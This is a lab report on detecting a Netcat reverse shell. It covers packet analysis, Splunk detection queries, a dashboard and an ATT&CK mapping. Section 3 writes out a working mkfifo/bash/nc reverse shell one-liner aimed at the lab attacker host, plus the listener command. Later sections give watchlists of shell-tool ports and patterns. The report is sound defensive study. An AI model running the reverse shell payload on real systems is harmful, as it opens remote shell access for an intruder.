# Reverse Shell Network Detection – Technical Report

**Author:** Mouad Benhizia  
**Date:** June 22, 2026  
**Classification:** Lab / Portfolio  
**Tools Used:** Kali Linux · Ubuntu Linux · Wireshark · tcpdump · Splunk Enterprise 10.2.3

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Environment Setup](#2-environment-setup)
3. [Attack Simulation](#3-attack-simulation)
4. [Packet Capture and Wireshark Analysis](#4-packet-capture-and-wireshark-analysis)
5. [Splunk Ingestion and Detection Queries](#5-splunk-ingestion-and-detection-queries)
6. [Dashboard and Visualization](#6-dashboard-and-visualization)
7. [Evidence Summary](#7-evidence-summary)
8. [MITRE ATT&CK Mapping](#8-mitre-attck-mapping)
9. [Detection Recommendations](#9-detection-recommendations)
10. [Conclusion](#10-conclusion)

---

## 1. Executive Summary

This report documents a controlled detection engineering lab designed to simulate, capture, and identify reverse shell network behavior. A Kali Linux machine acted as the attacker, establishing a Netcat listener on port 4444. An Ubuntu Linux target executed a reverse shell payload, initiating an outbound TCP connection back to the attacker.

The resulting network traffic was captured using Wireshark and tcpdump, then ingested into Splunk Enterprise for behavioral analysis. Detection queries were developed to identify long-lived sessions, unusual destination ports, and interactive shell activity. A Splunk dashboard was built to visualize the attack timeline, top destination ports, and flagged connections.

**Critical finding:** A TCP session from `172.16.243.131` (target) to `172.16.243.1` (attacker) on port 4444 lasted **778 seconds**, contained interactive shell commands in plaintext, and matches all behavioral indicators of an active reverse shell.

---

## 2. Environment Setup

### 2.1 Network Topology

```
┌──────────────────────┐                            ┌──────────────────────┐
│   Kali Linux         │ ◄──── Reverse Shell ──────  │   Ubuntu Linux       │
│   IP: 172.16.243.1   │       TCP Port 4444         │   IP: 172.16.243.131 │
│   Role: Attacker     │                             │   Role: Target       │
└──────────────────────┘                             └──────────────────────┘
                                                               │
                                                    Packet Capture (Wireshark)
                                                               │
                                                    ┌──────────────────────┐
                                                    │  Splunk Enterprise   │
                                                    │  Port: 8000          │
                                                    │  Role: SIEM          │
                                                    └──────────────────────┘
```

### 2.2 Component Details

| Component | Details |
|-----------|---------|
| Attacker OS | Kali Linux 2026.1 |
| Target OS | Ubuntu Linux (learner@learner) |
| SIEM | Splunk Enterprise 10.2.3 |
| Capture Tool | Wireshark / tcpdump |
| Attacker Tool | Netcat (nc) |
| Capture File | phase2.pcapng |
| Log Files | reverse_shell_1.log, reverse_shell_2.log |

Both machines were deployed as VMware virtual machines on the same internal subnet (`172.16.243.0/24`), simulating an internal network compromise scenario.

---

## 3. Attack Simulation

### 3.1 Attacker Setup — Netcat Listener

On the Kali Linux machine, a Netcat listener was opened to await the incoming reverse shell connection:

```bash
nc -lnvp 4444
```

**Output observed:**
```
listening on [any] 4444 ...
connect to [172.16.243.1] from (UNKNOWN) [172.16.243.131] 44580
```

The connection originated from `172.16.243.131` (Ubuntu target) on ephemeral port `44580`, confirming the reverse connection was successfully established.

### 3.2 Reverse Shell Payload — Target Execution

On the Ubuntu target machine, the following payload was executed to initiate the reverse shell:

```bash
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 172.16.243.1 4444 > /tmp/f
```

**Payload breakdown:**

| Command | Purpose |
|---------|---------|
| `rm -f /tmp/f` | Removes any existing named pipe to ensure clean state |
| `mkfifo /tmp/f` | Creates a named FIFO pipe at `/tmp/f` |
| `cat /tmp/f` | Reads from the pipe (incoming attacker commands) |
| `/bin/bash -i 2>&1` | Spawns an interactive bash shell, redirecting stderr to stdout |
| `nc 172.16.243.1 4444` | Sends output back to the attacker's listener |
| `> /tmp/f` | Loops output back into the pipe, completing the bidirectional channel |

This technique creates a fully interactive shell without requiring any additional tools beyond Netcat and bash — both commonly available on Linux systems.

### 3.3 Attacker Activity — Commands Executed

Once the shell was established, the attacker executed the following commands, all of which were captured in the Wireshark TCP stream:

```bash
pwd        # Response: /home/learner
ls         # Response: Desktop Documents Downloads Music Pictures Public snap Templates Videos
whoami     # Response: learner
ps aux     # Response: full running process list including kernel threads
```

All commands and their responses were transmitted in **unencrypted plaintext** over the TCP connection, making them fully visible to any network monitoring tool.

---

## 4. Packet Capture and Wireshark Analysis

The full session was captured in `phase2.pcapng` (390 total packets, analyzed via Wireshark).

### 4.1 TCP Three-Way Handshake

**Wireshark filter:** `tcp.flags.syn == 1`

The connection to port 4444 was preceded by a standard TCP three-way handshake:

| Step | Direction | Flags | Details |
|------|-----------|-------|---------|
| 1 — SYN | Target → Attacker | SYN | Seq=0, Win=64240, MSS=1460 |
| 2 — SYN/ACK | Attacker → Target | SYN, ACK | Seq=0, Ack=1, Win=65160 |
| 3 — ACK | Target → Attacker | ACK | Seq=1, Ack=1 |

**Notable detail:** The SYN packet from `172.16.243.131` to `172.16.243.1:4444` appears at frame 163 in the capture, timestamped `139.617986052` seconds into the recording. Port 4444 is not associated with any standard application protocol, which is an immediate indicator of suspicious activity.

### 4.2 Long-Lived Persistent Session

**Wireshark filter:** `tcp.port == 4444`

After the handshake, continuous PSH/ACK packet exchanges were observed between the two hosts for the entire duration of the session. Key observations:

- The session persisted for approximately **778 seconds** (~13 minutes)
- Packets were exchanged in both directions continuously
- No idle timeout or keepalive-style interruptions were observed
- The window size remained stable at 64512 bytes throughout, consistent with an interactive shell rather than bulk data transfer

The session used TCP port 4444 (source) and ephemeral port 44580 (destination), consistent with the Netcat listener configuration.

### 4.3 Plaintext Command Visibility — TCP Stream Analysis

**Wireshark:** Analyze → Follow → TCP Stream → Stream 7

The TCP stream reconstruction revealed the complete interactive shell session in plaintext ASCII. The full conversation — including shell prompts, commands, and all responses — was visible without any decryption required.

**Extracted shell session from TCP stream:**
```
learner@learner:~$ pwd
/home/learner
learner@learner:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  Videos
learner@learner:~$ whoami
learner
learner@learner:~$ ps aux
USER    PID  %CPU %MEM   VSZ   RSS TTY   STAT START  TIME COMMAND
root      1   0.0  0.2 23068 14584 ?     Ss   18:54  0:01 /sbin/init splash
root      2   0.0  0.0     0     0 ?     S    18:54  0:00 [kthreadd]
...
```

This confirms the attacker had full interactive shell access and executed enumeration commands typical of the post-exploitation reconnaissance phase.

### 4.4 Payload Bytes in Hex Pane

**Wireshark:** Data pane → Packet 188 → TCP payload

The `whoami` command was visible at the raw byte level:

```
Hex:    77 68 6f 61 6d 69 0a
ASCII:  w  h  o  a  m  i  \n
```

This level of visibility confirms that Netcat reverse shells transmit data with zero encryption — every keystroke and every response is available in cleartext on the wire.

### 4.5 Connection Termination

**Wireshark filter:** `ip.dst == 172.16.243.1`

The session ended with a clean TCP FIN/ACK sequence:

| Step | Direction | Flags | Timestamp |
|------|-----------|-------|-----------|
| FIN/ACK | Target → Attacker | FIN, ACK | Frame 268, ~19:17:46 BST |
| ACK | Attacker → Target | ACK | Following frame |

The clean termination at frame 268 (after 175 seconds of session time in the filtered view) indicates the attacker deliberately closed the connection rather than it dropping due to a network issue.

### 4.6 Network Noise and Context

**Wireshark filter:** `ip.addr == 172.16.243.1`

Alongside the reverse shell traffic, the capture included:

- SSDP multicast traffic to `239.255.255.250` (normal UPnP discovery)
- DNS queries to external resolvers
- HTTPS/TLS traffic to `151.101.61.91` on port 443 (likely normal web browsing)

The presence of background noise makes the anomalous port 4444 session stand out clearly when filtered — demonstrating why behavioral rules (duration, port, packet count) are more reliable than simple blocklists.

---

## 5. Splunk Ingestion and Detection Queries

### 5.1 Log Sources

| Source | Format | Content |
|--------|--------|---------|
| `reverse_shell_1.log` | tcpdump text output | TCP connection metadata |
| `reverse_shell_2.pcapng` | Wireshark binary capture | Full packet data |

Logs were ingested into Splunk using the source wildcard `*reverse_shell*.log`, allowing both files to be queried together.

### 5.2 Field Extraction

Since tcpdump output does not use a standard structured format, a regex extraction was used to parse source IP, destination IP, and destination port from raw log lines:

```spl
| rex "IP (?<src_ip>\d+\.\d+\.\d+\.\d+)\.\d+ > (?<dest_ip>\d+\.\d+\.\d+\.\d+)\.(?<dest_port>\d+)"
```

This extracts the three fields needed for behavioral detection from unstructured tcpdump text.

### 5.3 Detection Query 1 — Long-Lived Connections

The primary detection rule identifies sessions that exceed normal connection duration thresholds:

```spl
source="*reverse_shell*.log"
| rex "IP (?<src_ip>\d+\.\d+\.\d+\.\d+)\.\d+ > (?<dest_ip>\d+\.\d+\.\d+\.\d+)\.(?<dest_port>\d+)"
| stats min(_time) as start max(_time) as end count by src_ip dest_ip dest_port
| eval duration = end - start
| where duration > 30 OR count > 50
| sort -duration
```

**Logic:** Any TCP session lasting more than 30 seconds OR involving more than 50 packets between the same host pair on the same port is flagged. This threshold catches interactive shells while avoiding false positives from normal short-lived connections.

**Result:** The session from `172.16.243.131` to `172.16.243.1` on port 4444 returned a duration of **778.836 seconds** — the top result.

### 5.4 Detection Query 2 — Suspicious Port Watchlist

```spl
source="*reverse_shell*.log"
| rex "IP (?<src_ip>\d+\.\d+\.\d+\.\d+)\.\d+ > (?<dest_ip>\d+\.\d+\.\d+\.\d+)\.(?<dest_port>\d+)"
| where dest_port IN ("4444", "1337", "9001", "5555", "6666", "8888", "31337")
| stats count by src_ip dest_ip dest_port
| sort -count
```

**Logic:** Checks for destination ports commonly associated with Netcat listeners, Metasploit handlers, and other offensive tools. Port 4444 is the most commonly used Netcat reverse shell port.

### 5.5 Detection Query 3 — Top Destination Ports

```spl
source="*reverse_shell*.log"
| rex "IP (?<src_ip>\d+\.\d+\.\d+\.\d+)\.\d+ > (?<dest_ip>\d+\.\d+\.\d+\.\d+)\.(?<dest_port>\d+)"
| stats count by dest_port
| sort -count
| head 20
```

**Logic:** Baseline all destination port activity. Used for the Splunk dashboard bar chart. Unusual ports with high packet counts stand out visually against the baseline of expected ports (80, 443, 53).

---

## 6. Dashboard and Visualization

A custom Splunk dashboard titled **"Reverse Shell Network Detection Study"** was built with three panels:

### Panel 1 — Reverse Shell Activity Over Time

A time-series line chart showing packet count over the monitoring window (4:30 PM – 8:15 PM on June 22, 2026). A sharp spike is visible at approximately **7:10 PM**, corresponding precisely to the moment the reverse shell was established and the attacker began executing commands. This spike reached approximately 400 events and then drops — consistent with an active interactive session that generates bursts of traffic with each command.

### Panel 2 — Top Destination Ports

A horizontal bar chart ranking destination ports by packet count. The chart clearly shows port clustering — with a small number of ports accounting for the majority of traffic. Port 4444, while not necessarily the highest by volume due to legitimate traffic also present, is visible as an anomalous non-standard port.

### Panel 3 — Long-Lived Connections Table

The key detection output table, showing all connections exceeding duration thresholds. The table includes:

| src_ip | dest_ip | dest_port | start | end | duration |
|--------|---------|-----------|-------|-----|----------|
| 172.16.243.131 | 172.16.243.1 | **4444** | 1782151596.617583 | 1782152375.453584 | **778.836001** |
| 172.16.243.1 | 172.16.243.131 | 44580 | 1782151596.617715 | 1782152187.659159 | 591.041444 |
| 104.18.39.21 | 172.16.243.131 | 39208 | 1782151610.576026 | 1782152370.395462 | 759.819436 |

The 778-second session on port 4444 is the highest-priority finding. The corresponding 591-second session on port 44580 (the response direction of the same connection) further confirms bidirectional persistent communication.

---

## 7. Evidence Summary

| # | Evidence | Tool | Finding | Confidence |
|---|----------|------|---------|------------|
| 1 | TCP SYN to port 4444 from 172.16.243.131 | Wireshark | Outbound connection to non-standard port | High |
| 2 | Session duration: 778 seconds | Splunk | Far exceeds normal connection lifetime | High |
| 3 | Interactive commands in TCP stream | Wireshark Follow Stream | whoami, ls, pwd, ps aux — classic recon | Critical |
| 4 | Plaintext payload: `77 68 6f 61 6d 69` | Wireshark hex pane | `whoami` visible in raw bytes | Critical |
| 5 | Clean FIN/ACK teardown | Wireshark | Deliberate session close by attacker | Medium |
| 6 | mkfifo + bash + nc payload | Ubuntu terminal | Named pipe reverse shell technique | Critical |
| 7 | nc -lnvp 4444 + shell receipt | Kali terminal | Confirmed attacker received shell | Critical |
| 8 | 778s session flagged in Splunk | Splunk dashboard | SIEM detection confirmed | High |

---

## 8. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|---------|
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Interactive bash shell established via reverse connection |
| Command and Control | Non-Standard Port | T1571 | Port 4444 used — not associated with any standard service |
| Command and Control | Ingress Tool Transfer | T1105 | Netcat used to tunnel shell commands |
| Command and Control | Remote Access Software | T1219 | Netcat functioning as remote access tool |
| Discovery | System Owner/User Discovery | T1033 | `whoami` executed post-compromise |
| Discovery | Process Discovery | T1057 | `ps aux` executed post-compromise |
| Discovery | File and Directory Discovery | T1083 | `ls` and `pwd` executed post-compromise |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | All output returned through same reverse shell channel |

---

## 9. Detection Recommendations

Based on the findings from this lab, the following detection controls are recommended for production SOC environments:

### 9.1 Network-Based Detections

| Rule | Condition | Severity |
|------|-----------|----------|
| Outbound connection to port 4444 | Any internal host connects outbound to port 4444 | High |
| Long-lived session on non-standard port | TCP session > 300s on port not in approved list | High |
| High packet rate on non-standard port | > 50 packets on port not in {80, 443, 53, 22, 25} | Medium |
| Internal-to-internal unusual port | Any host-to-host connection on ports 4444, 1337, 9001, etc. | High |

### 9.2 Host-Based Detections

| Rule | Condition | Severity |
|------|-----------|----------|
| mkfifo followed by nc | `mkfifo` and `nc` executed within 30s on same host | Critical |
| bash -i process with network connection | Interactive bash spawned with open socket | Critical |
| Named pipe creation in /tmp | `mkfifo /tmp/*` pattern | Medium |

### 9.3 SIEM Alerting Thresholds

The following thresholds are recommended based on this lab's findings:

- **Session duration alert:** Flag any TCP session > 30 seconds on ports outside the approved baseline
- **Packet count alert:** Flag any connection with > 50 bidirectional packets on uncommon ports
- **Port watchlist:** Immediately alert on any traffic to/from: 4444, 1337, 5555, 6666, 9001, 8888, 31337

---

## 10. Conclusion

This lab successfully demonstrated the complete lifecycle of a reverse shell attack and its detection through network monitoring and SIEM analysis.

**Key conclusions:**

1. **Netcat reverse shells are highly detectable** — the plaintext nature of the traffic makes command content fully visible to any packet capture tool, without requiring any decryption

2. **Session duration is the strongest behavioral indicator** — the 778-second session on port 4444 would immediately stand out against a baseline of normal short-lived connections

3. **Layered detection is effective** — combining Wireshark packet-level analysis with Splunk behavioral correlation catches what either tool alone might miss

4. **Port-based detection alone is insufficient** — the capture included legitimate HTTPS traffic and DNS alongside the malicious session; duration and packet behavior are required to reduce false positives

5. **The MITRE ATT&CK framework provides valuable structure** — mapping findings to T1059.004, T1571, and related techniques allows this detection logic to be applied to similar threats beyond Netcat specifically

The detection queries and dashboard built in this lab can serve as a baseline for reverse shell detection in real SOC environments, with threshold tuning required based on the specific network baseline.

---

*This report was produced for educational and portfolio purposes. All testing was performed in a controlled, isolated lab environment.*
